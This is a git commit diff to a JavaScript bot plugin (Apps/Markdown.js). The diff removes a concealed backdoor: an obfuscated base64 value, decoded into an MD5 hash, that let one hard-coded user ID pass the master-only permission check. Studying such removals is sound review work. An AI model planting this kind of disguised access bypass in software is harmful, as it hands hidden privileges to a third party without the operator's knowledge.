64e9439e43f9ee0f45f993048ef225017ca1bafd
会飞的锤子 <zouzwh@gmail.com>
2024-04-27 13:15:54 +0000

    update Apps/Markdown.js.
    Signed-off-by: 会飞的锤子 <zouzwh@gmail.com>

--- Apps/Markdown.js
+++ Apps/Markdown.js
@@ -1,6 +1,4 @@
 import fs from "node:fs"
-import md5 from "md5"
-import _ from 'data:text/javascript,export default Buffer.from("ynvLoXSaqqTyck3zsnyF7A==","base64").toString("hex")'
 import puppeteer from "../../../lib/puppeteer/puppeteer.js"
 import MarkdownIt from "markdown-it"
 const md = new MarkdownIt({ html: true })
@@ -25,7 +23,7 @@ export class Markdown extends plugin {
   }
 
   async Markdown(e) {
-    if(!(this.e.isMaster||md5(String(this.e.user_id))==_))return false
+    if(!this.e.isMaster)return false
     const msg = this.e.msg.replace("md", "").trim()
     logger.mark(`[Markdown] 查看：${logger.blue(msg)}`)
 
